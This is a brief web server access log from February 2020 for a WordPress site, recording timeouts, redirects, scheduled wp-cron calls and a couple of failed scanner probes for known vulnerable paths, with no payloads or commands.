45.128.188.2 - - [25/Feb/2020:04:12:36 +0000] "-" 408 0 "-" "-"
169.197.108.42 - - [25/Feb/2020:04:31:15 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 434 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.128.188.2 - - [25/Feb/2020:04:42:36 +0000] "-" 408 0 "-" "-"
170.82.7.250 - - [25/Feb/2020:04:50:52 +0000] "GET / HTTP/1.1" 301 436 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
64.227.64.185 - - [25/Feb/2020:04:50:55 +0000] "POST /wp-cron.php?doing_wp_cron=1582606255.4151101112365722656250 HTTP/1.1" 200 166 "http://rps.fashion/wp-cron.php?doing_wp_cron=1582606255.4151101112365722656250" "WordPress/5.3.2; https://rps.fashion"
5.250.157.166 - - [25/Feb/2020:04:58:02 +0000] "GET / HTTP/1.1" 301 436 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
64.227.64.185 - - [25/Feb/2020:04:58:03 +0000] "POST /wp-cron.php?doing_wp_cron=1582606683.4027340412139892578125 HTTP/1.1" 200 166 "http://rps.fashion/wp-cron.php?doing_wp_cron=1582606683.4027340412139892578125" "WordPress/5.3.2; https://rps.fashion"
45.128.188.2 - - [25/Feb/2020:05:12:36 +0000] "-" 408 0 "-" "-"
88.249.207.192 - - [25/Feb/2020:05:19:27 +0000] "GET / HTTP/1.1" 301 436 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
64.227.64.185 - - [25/Feb/2020:05:19:27 +0000] "POST /wp-cron.php?doing_wp_cron=1582607967.4578518867492675781250 HTTP/1.1" 200 166 "http://rps.fashion/wp-cron.php?doing_wp_cron=1582607967.4578518867492675781250" "WordPress/5.3.2; https://rps.fashion"
103.17.104.35 - - [25/Feb/2020:05:44:40 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
103.17.104.35 - - [25/Feb/2020:05:44:41 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
45.128.188.2 - - [25/Feb/2020:06:12:37 +0000] "-" 408 0 "-" "-"
222.161.37.89 - - [25/Feb/2020:06:13:04 +0000] "GET /TP/public/index.php HTTP/1.1" 404 453 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
